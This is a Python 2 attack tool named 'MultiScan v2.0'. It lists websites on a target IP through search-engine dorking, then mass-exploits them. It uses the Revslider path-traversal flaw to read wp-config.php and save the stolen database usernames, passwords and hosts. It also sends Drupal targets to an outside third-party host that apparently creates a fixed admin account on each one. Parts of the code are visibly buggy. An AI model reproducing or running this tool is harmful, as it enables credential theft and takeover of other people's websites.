#!/usr/bin/python
# >> Nexamos << 
# Code Name : MultiScan v2.0 
# Coder Name : Nexamos
# Facebook : fb.com/ApProx12

import urllib2,urllib,re,sys,json
from urlparse import urlparse

logo = '''
\t __  __       _ _   _ ____                  
\t|  \/  |_   _| | |_(_) ___|  ___ __ _ _ __  
\t| |\/| | | | | | __| \___ \ / __/ _` | '_ \ 
\t| |  | | | | | | |_| |___) | (_| (_| | | | |
\t|_|  |_|\__,_|_|\__|_|____/ \___\__,_|_| |_| v2.0
'''

menu ='''
\t[-01-] Get Websites Of Ip
\t[-02-] Drupal Sql Bot binger
\t[-03-] Revslider Bot  binger
\t[-04-] Get Drupal Websites
\t[-05-] Get Wordpress websites
\t[-06-] Get joomla websites
\t[-07-] Bing Dorker 
\t[-08-] Google Dorker
\t[-09-] Drupal List Website Exploit
\t[-10-] About Me
'''

def about():

     print '''
\t>> Nexamos << 
\tCode Name : MultiScan v2.0 
\tCoder Name : Nexamos
\tFacebook : fb.com/ApProx12
\tblog : Doftin.com 
\tGreetz : to all muslims and Tunisian Hacker And Special Greetz to  AdGhost
>>./By<<
'''

def bing():
 
 try:
   ip  = raw_input('1- Ip : ')
   page  = 1
   sites = list()
   while page <= 50 :
      
      url   = "http://www.bing.com/search?q=ip%3A"+ip+"&go=Valider&qs=n&form=QBRE&pq=ip%3A"+ip+"&sc=0-0&sp=-1&sk=&cvid=af529d7028ad43a69edc90dbecdeac4f&first="+str(page)
      req   = urllib2.Request(url)
      opreq = urllib2.urlopen(req).read()
      findurl = re.findall('<div class="b_title"><h2><a href="(.*?)" h=',opreq)
      page += 1 
      for url in findurl :
                    if url in sites :
                        urlpa = urlparse(url)
                        site  = urlpa.netloc
                        if site not in sites :
                                      print site 
                                      sites.append(site)
    
 except Exception as ex :
        print "Invalid Ip / Not found Websites"
    
          
def drupal():
 try:
    '''Drupal Exploit Binger All Websites Of server '''
    ip  = raw_input('2- Ip : ')
    page  = 1
    sites = list()
    while page <= 50 :
      
      url   = "http://www.bing.com/search?q=ip%3A"+ip+"&go=Valider&qs=n&form=QBRE&pq=ip%3A"+ip+"&sc=0-0&sp=-1&sk=&cvid=af529d7028ad43a69edc90dbecdeac4f&first="+str(page)
      req   = urllib2.Request(url)
      opreq = urllib2.urlopen(req).read()
      findurl = re.findall('<div class="b_title"><h2><a href="(.*?)" h=',opreq)
      page += 1 
      
      for url in findurl :
        if url in sites :
                      urlpa = urlparse(url)
                      site  = urlpa.netloc
                      if site not in sites :
 
                        sites.append(site)
                        print "[+] Testing At "+site
                        resp = urllib2.urlopen('http://www.alenjazglass.com/drupal.php?url='+site+'&submit=submit')
                        read=resp.read()
                        if "User : abdourh" in read:
                           print "Exploit found =>"+site

                           print "user:abdourh\npass:admin"
                           a = open('up.txt','a')
                           a.write(site+'\n')
                           a.write("user:"+user+"\npass:"+pwd+"\n")
                        else :
                           print "[-] Expl Not Found :( "
 except Exception as ex :
        print "Invalid Ip / Not found Websites"
      
def rev():
 try : 

    ip  = raw_input('3- Ip : ')
    page  = 1
    while page <= 50 :
      
      url   = "http://www.bing.com/search?q=ip%3A"+ip+"&go=Valider&qs=n&form=QBRE&pq=ip%3A"+ip+"&sc=0-0&sp=-1&sk=&cvid=af529d7028ad43a69edc90dbecdeac4f&first="+str(page)
      req   = urllib2.Request(url)
      opreq = urllib2.urlopen(req).read()
      findurl = re.findall('<div class="b_title"><h2><a href="(.*?)" h=',opreq)
      page += 1 
      site = list()
      for url in findurl :
        try : 
             if url not in site:
                        urlpa = urlparse(url)
                        site  = urlpa.netloc
                        sites.append(site)
                        read = urllib2.urlopen('http://'+site+'/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php').read()
                        print "Testing At "+site
                        if "DB_USER" in read : 
                                            print "[+] Exploit Found :"+site
                                            user = re.search("\('DB_USER', *'(.*?)' *\)",read).group(1)
                                            print '[+] DB_USER :'+user
                                            pwd = re.search("\('DB_PASSWORD', *'(.*?)' *\)",read).group(1)
                                            print '[+] DB_PASSWORD :'+pwd
                                            host = re.search("\('DB_HOST', *'(.*?)' *\)",read).group(1)
                                            print '[+] DB_HOST :'+host
                                            w = open('revslider.txt','a')
                                            w.write("http://"+site+"\nDB_USER:"+user+"\nDB_PASSWORD :"+pwd+"\nDB_HOST :"+host+"\n")  
                        else : 
                                            print "[-] Exploit Not Found"
        except Exception as ex :
                        print site +" [-] Not Wordpress"


 except Exception as ex :
        print "Invalid Ip / Not found Websites"
  
def getdrupal():
 try : 
    ip  = raw_input('4- Ip : ')
    page  = 1
    sites = list()
    while page <= 50 :
      
      url   = "http://www.bing.com/search?q=ip%3A"+ip+"+node&go=Valider&qs=ds&form=QBRE&first="+str(page)
      req   = urllib2.Request(url)
      opreq = urllib2.urlopen(req).read()
      findurl = re.findall('<div class="b_title"><h2><a href="(.*?)" h=',opreq)
      page += 1 
      
      for url in findurl :
                             split = urlparse(url)
                             site   = split.netloc
                             if site not in sites :
                                      print site 
                                      sites.append(site)
      
 except Exception as ex :
        print "Invalid Ip / Not found Websites"

def getwp():
 try : 
    ip = raw_input('5- Ip:')
    first = 1
    sites = list()
    while first <= 50 :
        op   = urllib2.urlopen('http://www.bing.com/search?q=ip%3A'+ip+'+wordpress&first='+str(first))
        read = op.read()
        site = re.search('<div class="b_title"><h2><a href="(.*?)" h=',read).group(1)
        site = urlparse(site).netloc
        if site not in sites :
            print site 
            sites.append(site)
        first +=1

 except Exception as ex :
        print "Invalid Ip / Not found Websites"

def getjom():
 try : 
       ip = raw_input('6- Ip:')
       first = 1
       sites = list()
       while page <= 50 :
                         op = urllib2.urlopen('http://www.bing.com/search?q=ip%3'+ip+'+%3Foption%3D&first='+str(first))
                         read = op.read()
                         find = re.findall('<div class="b_title"><h2><a href="(.?*)" h=',read)
                         first +=1
                         for url in find :
                             split = urlparse(url)
                             site   = split.netloc
                             if site not in sites :
                                      print site 
                                      sites.append(site)
                             first +=1
 except Exception as ex :
        print "Invalid Ip / Not found Websites"

def bingerdork():
 try :
    ''' Bing Dorker '''
    dork  = raw_input('7- D0rk : ')
    code  = urllib.urlencode({'?q':dork})
    page  = 1
    sites = list()
    while page <= 50 :
      
      url   = "http://www.bing.com/search"+code+"&first="+str(page)
      req   = urllib2.Request(url)
      opreq = urllib2.urlopen(req).read()
      findurl = re.findall('<div class="b_title"><h2><a href="(.*?)" h=',opreq)
      
      for url in findurl :
                             split = urlparse(url)
                             site   = split.netloc
                             if site not in sites :
                                      print site 
                                      sites.append(site)
      page +=1

 except Exception as ex :
        print "Invalid Ip / Not found Websites"

def google():
 try :
    ''' Google Dorker '''
    dork  = raw_input('2- D0rk : ')
    code  = urllib.urlencode({'q':dork})
    page  = 0
    sites = list()
    while page <= 50 :
      
      url   = "http://ajax.googleapis.com/ajax/services/search/web?v=1.0&"+code+"&start="+str(page)
      opreq = urllib2.urlopen(url)
      objects = json.load(opreq)
      results = []
      for result in objects['responseData']['results']:
                     url = result['url']
                     split = urlparse(url)
                     site   = split.netloc
                     if site not in sites :
                                      print site 
                                      sites.append(site)
      page+=1

 except Exception as ex :
        print "Invalid Ip / Not found Websites"
   
def drupallist():
 try:
        listop = raw_input("Enter The list Txt :")
	fileopen = open(listop,'r')
	content = fileopen.readlines() 
	for i in content :
                url=i.strip()
		try :
			openurl = urllib2.urlopen('http://www.alenjazglass.com/drupal.php?url='+url+'&submit=submit')
			readcontent = openurl.read()
			if  "Success" in readcontent :
                                print "[+]Success =>"+url
				print "[-]username:abdourh\n[-]password:admin"
                                save = open('drupal.txt','a')
                                save.write(url+"\n"+"[-]username:abdourh\n[-]password:admin\n")
                               
			else : 
				print i + "=> exploit not found " 
		except Exception as ex :
                   		print ex
 except Exception as ex :
        print "Invalid Ip / Not found Websites"

def main():
 print logo
 print menu
 choose = raw_input("choose a number :")
 while True : 
  if choose == "1":
    bing()
    print site
  if choose == "2": 
    drupal()
  if choose == "3":
    rev()
  if choose == "4":
    getdrupal()
  if choose == "5":
    getwp()
  if choose == "6":
    getjom()
  if choose == "7":
    bingerdork()
  if choose == "8":
    google()
  if choose == "9":
    drupallist()
  if choose == "10":
    about()
  if choose == "11":
        print "#By"
        exit()
  con = raw_input('Continue [Y/n] -> ')
  if con[0].upper() == 'N' :
                                exit()
  if con[0].upper() == 'Y' :
                                main()
                                

if __name__ == '__main__':main()

